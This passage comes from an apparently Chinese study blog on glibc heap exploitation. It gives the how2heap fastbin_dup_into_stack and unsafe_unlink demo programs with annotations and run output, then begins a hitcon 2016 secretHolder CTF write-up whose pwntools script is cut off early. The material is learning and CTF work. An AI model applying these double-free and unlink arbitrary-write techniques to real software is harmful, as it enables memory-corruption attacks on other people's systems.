class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 该技术通常用来将堆块分配在栈上</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><br>       <span class="hljs-string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);<br><br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> stack_var;<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="hljs-number">8</span>+(<span class="hljs-type">char</span> *)&amp;stack_var);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br><br><span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(a);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br><br><span class="hljs-comment">// free(a);</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br><br><span class="hljs-built_in">free</span>(b);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br><br><span class="hljs-built_in">free</span>(a);<br><br><br><span class="hljs-comment">// 这时候形成了堆块a和堆块b的循环链表</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><br><span class="hljs-string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, d);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><br><span class="hljs-string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><br><span class="hljs-string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><br><span class="hljs-string">&quot;return a pointer to it.\n&quot;</span>, a);<br><br>stack_var = <span class="hljs-number">0x20</span>;<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);<br><br>*d = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) (((<span class="hljs-type">char</span>*)&amp;stack_var) - <span class="hljs-keyword">sizeof</span>(d));<br><span class="hljs-comment">// 需要对堆块a有修改的权限，修改其fd指针区域</span><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./fastbin_dup_into_stack<br>This file extends on fastbin_dup.c by tricking <span class="hljs-built_in">malloc</span> into<br>returning a pointer to a controlled <span class="hljs-title function_">location</span> <span class="hljs-params">(in this <span class="hljs-keyword">case</span>, the <span class="hljs-built_in">stack</span>)</span>.<br>The address we want <span class="hljs-title function_">malloc</span><span class="hljs-params">()</span> to <span class="hljs-keyword">return</span> is 0x7ffd5d534248.<br>Allocating 3 buffers.<br>1st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5030<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5050<br>Freeing the first one...<br>If we <span class="hljs-built_in">free</span> 0x1ae5010 again, things will crash because 0x1ae5010 is at the top of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>So, instead, we&#x27;ll <span class="hljs-built_in">free</span> 0x1ae5030.<br>Now, we can <span class="hljs-built_in">free</span> 0x1ae5010 again, since it&#x27;s not the head of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>Now the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span> has [ 0x1ae5010, 0x1ae5030, 0x1ae5010 ]. We&#x27;ll now carry out our attack by modifying data at 0x1ae5010.<br>1st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5030<br>Now the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span> has [ 0x1ae5010 ].<br>Now, we have access to 0x1ae5010 <span class="hljs-keyword">while</span> it remains at the head of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>so now we are writing a fake <span class="hljs-built_in">free</span> <span class="hljs-title function_">size</span> <span class="hljs-params">(in this <span class="hljs-keyword">case</span>, <span class="hljs-number">0x20</span>)</span> to the <span class="hljs-built_in">stack</span>,<br>so that <span class="hljs-built_in">malloc</span> will think there is a <span class="hljs-built_in">free</span> chunk there and agree to<br><span class="hljs-keyword">return</span> a pointer to it.<br>Now, we overwrite the first 8 bytes of the data at 0x1ae5010 to point right before the 0x20.<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5010, putting the <span class="hljs-built_in">stack</span> address on the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span><br>4th <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x7ffd5d534248<br></code></pre></td></tr></table></figure><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 使用unlink实现任意地址写，想要深刻理解还是需要对c语言的指针操作和链表操作有一定的认识</span><br><span class="hljs-comment">// 很重要的一点是需要一个全局变量来存储malloc得到的指针</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">uint64_t</span> *chunk0_ptr;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);<br><span class="hljs-comment">// 需要一个全局变量</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);<br><br><br><span class="hljs-comment">// unlink的前提是不使用fastbin</span><br><span class="hljs-type">int</span> malloc_size = <span class="hljs-number">0x80</span>; <span class="hljs-comment">//we want to be big enough not to use fastbins</span><br><br><span class="hljs-type">int</span> header_size = <span class="hljs-number">2</span>;<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);<br><br><br><br>chunk0_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br><br><span class="hljs-type">uint64_t</span> *chunk1_ptr  = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br><span class="hljs-comment">// 注意ptr0的指针所在的地址和其本身的值</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);<br><span class="hljs-comment">// 这里是修改fake_chunk的fd指针来绕过p-&gt;fd-&gt;bk = p的检查，注意这里是ptr0指针的地址减去对应的值</span><br>chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">3</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<br><span class="hljs-comment">// 这里是修改fake_chunk的bk指针来绕过p-&gt;bk-&gt;fd = p的检查，注意这里是ptr0指针的地址减去对应的值</span><br>chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">2</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">3</span>]);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);<br><span class="hljs-comment">// 这里需要一个堆溢出，设置chunk1的头，chunk1是高地址的一个堆块</span><br><span class="hljs-type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);<br><span class="hljs-comment">// 设置chunk1的pre_size，这样才能使得chunk1找到fake_chunk去脱链，从而找到我们伪造的fd和bk</span><br>chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="hljs-type">void</span>*)chunk1_hdr[<span class="hljs-number">0</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);<br><span class="hljs-comment">// 设置上一个堆块处于释放状态</span><br>chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(chunk1_ptr);<br><span class="hljs-comment">// 这样，我们chunk0_ptr指针的地址里面存储的就是这个地址减去3个字节处的地址</span><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);<br><br><span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>];<br><br><span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br><br>chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;<br><span class="hljs-comment">// 修改chunk0_ptr指向字符串指针</span><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original value: %s\n&quot;</span>,victim_string);<br><br>chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242</span>LL;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New Value: %s\n&quot;</span>,victim_string);<br><br><br><br><span class="hljs-comment">// sanity check</span><br><br>assert(*(<span class="hljs-type">long</span> *)victim_string == <span class="hljs-number">0x4141414142424242</span>L);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./unsafe_unlink<br>Welcome to unsafe unlink <span class="hljs-number">2.0</span>!<br>Tested in Ubuntu <span class="hljs-number">14.04</span>/<span class="hljs-number">16.04</span> <span class="hljs-number">64b</span>it.<br>This technique can be used when you have a pointer at a known location to a region you can call unlink on.<br>The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.<br>The point of this exercise is to use <span class="hljs-built_in">free</span> to corrupt the global chunk0_ptr to achieve arbitrary memory write.<br><br>The global chunk0_ptr is at <span class="hljs-number">0x602078</span>, pointing to <span class="hljs-number">0x116c010</span><br>The victim chunk we are going to corrupt is at <span class="hljs-number">0x116c0a0</span><br><br>We create a fake chunk inside chunk0.<br>We setup the <span class="hljs-string">&#x27;next_free_chunk&#x27;</span> (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.<br>We setup the <span class="hljs-string">&#x27;previous_free_chunk&#x27;</span> (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.<br>With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False<br>Fake chunk fd: <span class="hljs-number">0x602060</span><br>Fake chunk bk: <span class="hljs-number">0x602068</span><br><br>We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.<br>We shrink the size of chunk0 (saved as <span class="hljs-string">&#x27;previous_size&#x27;</span> in chunk1) so that <span class="hljs-built_in">free</span> will think that chunk0 starts where we placed our fake chunk.<br>It<span class="hljs-number">&#x27;</span>s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly<br>If we had <span class="hljs-string">&#x27;normally&#x27;</span> freed chunk0, chunk1.previous_size would have been <span class="hljs-number">0x90</span>, however this is its new value: <span class="hljs-number">0x80</span><br>We mark our fake chunk as <span class="hljs-built_in">free</span> by setting <span class="hljs-string">&#x27;previous_in_use&#x27;</span> of chunk1 as False.<br><br>Now we <span class="hljs-built_in">free</span> chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.<br>You can find the source of the unlink macro at https:<span class="hljs-comment">//sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><br><br>At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.<br>chunk0_ptr is now pointing where we want, we use it to overwrite our victim <span class="hljs-built_in">string</span>.<br>Original value: Hello!~<br>New Value: BBBBAAAA<br></code></pre></td></tr></table></figure><h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h3><h4 id="hitcon-2016-secretHolder"><a href="#hitcon-2016-secretHolder" class="headerlink" title="hitcon_2016_secretHolder"></a>hitcon_2016_secretHolder</h4><p>题目流程比较简单，没有开启<code>PIE</code>并且有全局变量，在消除堆块的代码块里没有对堆块的使用情况做判断，导致<code>double free</code>。在开始利用到了<code>fastbin_dup_consolidate</code>的技巧制造堆块重叠使得我们能够修改堆块头，之后就是unlink的操作实现任意地址写。</p><p><strong>需要注意的是，我们在分配<code>huge</code>这个超大堆块（0x61A80）的时候，<code>sysmalloc()</code>函数是调用了<code>mmap()</code>来进行扩展堆块的，因为0x61A80已经超过了阈值<code>mp_.mmap_threshold</code>（一般为128KB），导致我们的堆块与现存的堆块有一段偏移，难以利用，那如何解决？我们发现在libc释放由<code>mmap()</code>分配的堆块时，会动态调整阈值，这里很明显是调大了阈值，使得下一次我们再次请求<code>huge</code>这个堆块的时候，就会获得与当前堆块紧邻的堆块，达到我们unlink的条件。</strong>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<span class="hljs-comment">// 调整阈值</span><br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./secretHolder_hitcon_2016&quot;</span>)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> data : sh.send(data)<br>sda = <span class="hljs-keyword">lambda</span> information, data : sh.sendafter(information, data)<br>sdla = <span class="hljs-keyword">lambda</span> information, data : sh.sendlineafter(information, data)<br><br>small_ptr_addr = <span class="hljs-number">0x6020B0</span><br>big_ptr_addr = <span class="hljs-number">0x6020A0</span><br>elf = ELF(<span 